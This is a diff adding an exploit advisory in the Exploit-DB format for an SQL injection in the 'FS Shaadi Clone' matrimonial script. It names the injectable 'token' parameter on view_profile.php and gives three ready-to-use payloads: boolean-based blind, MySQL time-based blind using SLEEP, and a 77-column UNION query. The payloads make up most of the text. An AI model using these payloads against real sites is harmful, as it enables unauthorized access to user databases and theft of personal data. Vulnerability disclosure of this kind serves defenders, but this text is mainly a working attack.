@@ -1,0 +1,29 @@
+# Exploit Title: FS Shaadi Clone - SQL Injection
+# Date: 2017-12-05
+# Exploit Author: Dan°
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/shaadi-clone/
+# Version: 2017-12-05
+# Tested on: Kali Linux 2.0
+
+(PoC):
+SQL Injection on GET parameter = token
+http://localhost/view_profile.php?token=
+
+---
+Parameter: token (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: token=2060a87ff679a2f3e71d9181a67b7542122c' AND 9253=9253--
+Eqjw
+
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind
+Payload: token=2060a87ff679a2f3e71d9181a67b7542122c' AND SLEEP(5)-- aVZf
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 77 columns
+Payload: token=-5886' UNION ALL SELECT
+NULL,CONCAT(0x7162787171,0x6153755a46504d6a546578714d765a594a5359556c414f4d736c45444958686e4455564770526272,0x7170787071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+nVKG
+---
